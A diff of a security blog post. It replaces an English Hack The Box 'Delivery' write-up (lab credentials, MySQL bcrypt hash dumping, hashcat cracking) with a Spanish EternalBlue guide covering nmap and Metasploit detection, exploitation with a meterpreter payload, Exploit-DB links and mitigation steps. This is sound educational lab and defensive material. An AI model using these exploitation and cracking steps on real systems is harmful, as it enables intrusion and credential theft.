@@ -1,220 +1,135 @@
 ---
 layout: single
-title: Delivery - Hack The Box
-excerpt: "Delivery is a quick and fun easy box where we have to create a MatterMost account and validate it by using automatic email accounts created by the OsTicket application. The admins on this platform have very poor security practices and put plaintext credentials in MatterMost. Once we get the initial shell with the creds from MatterMost we'll poke around MySQL and get a root password bcrypt hash. Using a hint left in the MatterMost channel about the password being a variation of PleaseSubscribe!, we'll use hashcat combined with rules to crack the password then get the root shell."
-date: 2021-05-22
+title: Eternal Blue
+excerpt: "El post aborda la preocupante vulnerabilidad asociada con EternalBlue, un exploit utilizado para propagar malware, como WannaCry. En este análisis, nos enfocamos en proporcionar una guía detallada sobre la identificación y mitigación de esta amenaza, destacando las consecuencias potencialmente devastadoras que puede tener en los sistemas.
+
+Exploramos los métodos para identificar y expotar la vulnerabilidad de EternalBlue en un sistema, analizando sus características distintivas y comportamientos asociados. Además, el post ofrece soluciones efectivas para solventar esta vulnerabilidad, detallando pasos prácticos que los administradores y usuarios pueden seguir para proteger sus sistemas contra posibles ataques.
+
+Al comprender la gravedad de la amenaza y adoptar medidas proactivas, los lectores podrán fortalecer la seguridad de sus sistemas, reduciendo significativamente el riesgo de explotación de EternalBlue. Este análisis también resalta la importancia de abordar de manera sistemática las vulnerabilidades conocidas, subrayando su impacto potencial y la necesidad de una respuesta rápida y efectiva para garantizar la integridad y la seguridad de los sistemas informáticos"
+date: 2023-12-29
 classes: wide
 header:
-  teaser: /assets/images/htb-writeup-delivery/delivery_logo.png
+  teaser: /assets/images/vuln_eternal_blue/Logo.png
   teaser_home_page: true
-  icon: /assets/images/hackthebox.webp
+  icon: /assets/images/vuln.png
 categories:
-  - hackthebox
-  - infosec
+  - Vulnerabilidad
+  - Windows
 tags:  
-  - osticket
-  - mysql
-  - mattermost
-  - hashcat
-  - rules
+  - vulnerabilidad
+  - windows
+  - EternalBlue
+  - metasploit
+  - nmap
 ---
 
-![](/assets/images/htb-writeup-delivery/delivery_logo.png)
+![](/assets/images/vuln_eternal_blue/Logo.png)
 
-Delivery is a quick and fun easy box where we have to create a MatterMost account and validate it by using automatic email accounts created by the OsTicket application. The admins on this platform have very poor security practices and put plaintext credentials in MatterMost. Once we get the initial shell with the creds from MatterMost we'll poke around MySQL and get a root password bcrypt hash. Using a hint left in the MatterMost channel about the password being a variation of PleaseSubscribe!, we'll use hashcat combined with rules to crack the password then get the root shell.
+# Definición
 
-## Portscan
+EternalBlue es un conjunto de vulnerabilidades en el software de Microsoft y, al mismo tiempo, un exploit desarrollado por la Agencia de Seguridad Nacional (NSA) como herramienta de ciberataque. Oficialmente denominado MS17-010 por Microsoft, este exploit impacta exclusivamente a los sistemas operativos Windows. Sin embargo, cualquier dispositivo que utilice el protocolo de intercambio de archivos SMBv1 (Server Message Block versión 1) se encuentra técnicamente en riesgo de ser blanco de ransomware y otros tipos de ciberataques.
 
-```
-Nmap scan report for 10.129.148.141
-Host is up (0.018s latency).
-Not shown: 65532 closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
-|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
-|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
-80/tcp   open  http    nginx 1.14.2
-|_http-server-header: nginx/1.14.2
-|_http-title: Welcome
-8065/tcp open  unknown
-| fingerprint-strings: 
-|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
-|     HTTP/1.1 400 Bad Request
-|     Content-Type: text/plain; charset=utf-8
-|     Connection: close
-|     Request
-|   GetRequest: 
-|     HTTP/1.0 200 OK
-|     Accept-Ranges: bytes
-|     Cache-Control: no-cache, max-age=31556926, public
-|     Content-Length: 3108
-|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
-|     Content-Type: text/html; charset=utf-8
-|     Last-Modified: Sun, 09 May 2021 00:00:02 GMT
-|     X-Frame-Options: SAMEORIGIN
-|     X-Request-Id: fqrpd5m3ftgnzmxkbieezqadxo
-|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
-|     Date: Sun, 09 May 2021 00:01:31 GMT
-|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
-|   HTTPOptions: 
-|     HTTP/1.0 405 Method Not Allowed
-|     Date: Sun, 09 May 2021 00:01:31 GMT
-|_    Content-Length: 0
+Esta vulnerabilidad posibilita que un atacante obtenga acceso remoto a la máquina afectada, lo que implica un riesgo significativo para la seguridad de los sistemas. En términos más simples, EternalBlue se convierte en una herramienta peligrosa que puede ser explotada para comprometer la integridad y privacidad de los sistemas informáticos que utilizan versiones vulnerables del software de Microsoft.
+
+# Identificación 
+
+Existen diferentes formas de poder escanear y identificar la vulnerabilidad de eternal blue la primera forma es con 
+
+```bash
+crackmapexec smb ip
 ```
 
-## Website
+si este nos devuelve e **SMBv1** en true significa que puede que el host sea vulnerable a eternal blue
 
-The Delivery website is pretty basic, there's a link to a vhost called helpdesk.delivery.htb and a contact us section. We'll add this entry to our local host before proceeding further.
+![](/assets/images/vuln_eternal_blue/1.png)
 
-![](/assets/images/htb-writeup-delivery/website1.png)
 
-The contact us section tells us we need an @delivery.htb email address and tells us port 8065 is a MatterMost server. MatterMost is a Slack-like collaboration platform that can be self-hosted.
+si deseas comprobar  comprobar con otra herramienta si es vulnerable puedes hacerlo con la herramienta de nmap con el siguiente comando
 
-![](/assets/images/htb-writeup-delivery/website2.png)
-
-Browsing to port 8065 we get the MatterMost login page but we don't have credentials yet
-
-![](/assets/images/htb-writeup-delivery/mm1.png)
-
-## Helpdesk
-
-The Helpdesk page uses the OsTicket web application. It allows users to create and view the status of ticket.
-
-![](/assets/images/htb-writeup-delivery/helpdesk3.png)
-
-We can still open new tickets even if we only have a guest user.
-
-![](/assets/images/htb-writeup-delivery/helpdesk1.png)
-
-After a ticket has been created, the system generates a random @delivery.htb email account with the ticket ID.
-
-![](/assets/images/htb-writeup-delivery/helpdesk2.png)
-
-Now that we have an email account we can create a MatterMost account.
-
-![](/assets/images/htb-writeup-delivery/mm2.png)
-
-A confirmation email is then sent to our ticket status inbox.
-
-![](/assets/images/htb-writeup-delivery/mm3.png)
-
-We use the check ticket function on the OsTicket application and submit the original email address we used when creating the ticket and the ticket ID.
-
-![](/assets/images/htb-writeup-delivery/mm4.png)
-
-We're now logged in and we see that the MatterMost confirmation email has been added to the ticket information.
-
-![](/assets/images/htb-writeup-delivery/mm5.png)
-
-To confirm the creation of our account we'll just copy/paste the included link into a browser new tab.
-
-![](/assets/images/htb-writeup-delivery/mm6.png)
-
-After logging in to MatterMost we have access to the Internal channel where we see that credentials have been posted. There's also a hint that we'll have to use a variation of the `PleaseSubscribe!` password later.
-
-![](/assets/images/htb-writeup-delivery/mm7.png)
-
-## User shell
-
-With the `maildeliverer / Youve_G0t_Mail!` credentials we can SSH in and get the user flag.
-
-![](/assets/images/htb-writeup-delivery/user.png)
-
-## Credentials in MySQL database
-
-After doing some recon we find the MatterMost installation directory in `/opt/mattermost`:
-
-```
-maildeliverer@Delivery:/opt/mattermost/config$ ps waux | grep -i mattermost
-matterm+   741  0.2  3.3 1649596 135112 ?      Ssl  20:00   0:07 /opt/mattermost/bin/mattermost
+```bash
+nmap -p445 -sCV --script="vuln and safe" ip
 ```
 
-The `config.json` file contains the password for the MySQL database:
+si la maquina es vulnerable te saldrá lo siguiente
 
-```
-[...]
-"SqlSettings": {
-        "DriverName": "mysql",
-        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
-[...]
-```
+![](/assets/images/vuln_eternal_blue/2.png)
 
-We'll connect to the database server and poke around.
+también puedes utilizar metasploit para escanear un host y verificar si este es vulnerable
 
-```
-maildeliverer@Delivery:/$ mysql -u mmuser --password='Crack_The_MM_Admin_PW'
-Welcome to the MariaDB monitor.  Commands end with ; or \g.
-Your MariaDB connection id is 91
-Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
-
-Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
-
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
-
-MariaDB [(none)]> show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| mattermost         |
-+--------------------+
+```bash
+use auxiliary/scanner/smb/smb_ms17_010
 ```
 
-MatterMost user accounts are stored in the `Users` table and hashed with bcrypt. We'll save the hashes then try to crack them offline.
+donde configuramos el scanner para que tome como host la ip de la victima 
 
+```bash
+set RHOSTS 10.10.174.11
 ```
-MariaDB [(none)]> use mattermost;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
+![](/assets/images/vuln_eternal_blue/3.png)
 
-Database changed
-MariaDB [mattermost]> select Username,Password from Users;
-+----------------------------------+--------------------------------------------------------------+
-| Username                         | Password                                                     |
-+----------------------------------+--------------------------------------------------------------+
-| surveybot                        |                                                              |
-| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
-| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
-| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
-| snowscan                         | $2a$10$spHk8ZGr54VWf4kNER/IReO.I63YH9d7WaYp9wjiRswDMR.P/Q9aa |
-| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
-| channelexport                    |                                                              |
-| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
-+----------------------------------+--------------------------------------------------------------+
-8 rows in set (0.002 sec)
+y ponemos a correr el escáner 
+
+```bash
+run
 ```
 
-## Cracking with rules
+![](/assets/images/vuln_eternal_blue/4.png)
 
-There was a hint earlier that some variation of `PleaseSubscribe!` is used.
 
-I'll use hashcat for this and since I don't know the hash ID for bcrypt by heart I can find it in the help.
+# Explotación
 
+para la explotacion utilizamos el modulo de **ms17_010_eternalblue** de metasploit ,donde cambiaremos el **rhosts** por la ip de la victima y cambiamos el **lhost** por nuestra ip
+
+```bash
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS victim_ip
+set lhost our_ip
 ```
-C:\bin\hashcat>hashcat --help | findstr bcrypt
-   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System
-```
+y para hacer la escala de privilegios como pide tryhackme cambiamos el payload por el siguiente
 
-My go-to rules is normally one of those two ruleset:
-
-- [https://github.com/NSAKEY/nsa-rules/blob/master/_NSAKEY.v2.dive.rule](https://github.com/NSAKEY/nsa-rules/blob/master/_NSAKEY.v2.dive.rule)
-- [https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule](https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule)
-
-These will perform all sort of transformations on the wordlist and we can quickly crack the password: `PleaseSubscribe!21`
-
-```
-C:\bin\hashcat>hashcat -a 0 -m 3200 -w 3 -O -r rules\_NSAKEY.v2.dive.rule hash.txt wordlist.txt
-[...]
-$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
-
-Session..........: hashcat
-Status...........: Cracked
-Hash.Name........: bcrypt $2*$, Blowfish (Unix)
-[...]
+```bash
+set payload windows/x64/meterpreter/bind_tcp
 ```
 
-The root password from MatterMost is the same as the local root password so we can just su to root and get the system flag.
+![](/assets/images/vuln_eternal_blue/5.png)
 
-![](/assets/images/htb-writeup-delivery/root.png)
+ahora ejecutamos el exploit y podemos ver que obtenemos una shell con la maquina victima 
+
+```bash
+run
+```
+![](/assets/images/vuln_eternal_blue/6.png)
+
+
+también en exploit db podemos encontrar exploit para aprovechar esta vulnerabilidad:
+- [Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) - Windows remote Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/42315)
+- [Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) - Windows remote Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/42031)
+
+
+# Maquinas para practicar
+
+- [[Blue tryhackme]]
+
+
+# Solventar  Eternal Blue
+
+1. **Actualiza tu Sistema Operativo:**
+	- Asegúrate de que tu sistema operativo Windows esté completamente actualizado con los últimos parches de seguridad. Puedes hacer esto a través de Windows Update.
+1. **Instala el Parche de Seguridad MS17-010:**
+    - El parche de seguridad MS17-010 aborda específicamente la vulnerabilidad EternalBlue. Asegúrate de haber instalado este parche en tu sistema. Puedes encontrar este parche en el sitio web oficial de Microsoft o a través de Windows Update.
+3. **Utiliza un Antivirus y Software de Seguridad:**
+    - Mantén un software antivirus y otras herramientas de seguridad actualizados para detectar y prevenir posibles amenazas.
+4. **Firewall y Configuración de Red:**
+    - Configura un firewall adecuado para bloquear el tráfico no deseado y limitar el acceso a los servicios innecesarios. Además, segmenta tu red para reducir el riesgo de propagación.
+5. **Monitorización y Detección de Amenazas:**
+    - Implementa herramientas de monitoreo y detección de amenazas para identificar posibles intentos de explotación de vulnerabilidades.
+6. **Auditoría de Seguridad:**
+    - Realiza auditorías de seguridad periódicas para identificar y abordar posibles debilidades en tu infraestructura.
+7. **Considera Desactivar SMBv1:**
+    - Si no es necesario, considera desactivar el protocolo SMBv1, ya que EternalBlue se aprovecha de vulnerabilidades en este protocolo. Sin embargo, ten en cuenta que desactivar SMBv1 puede afectar la compatibilidad con sistemas más antiguos que dependen de este protocolo.
+
+# Referencias
+- https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+- https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+
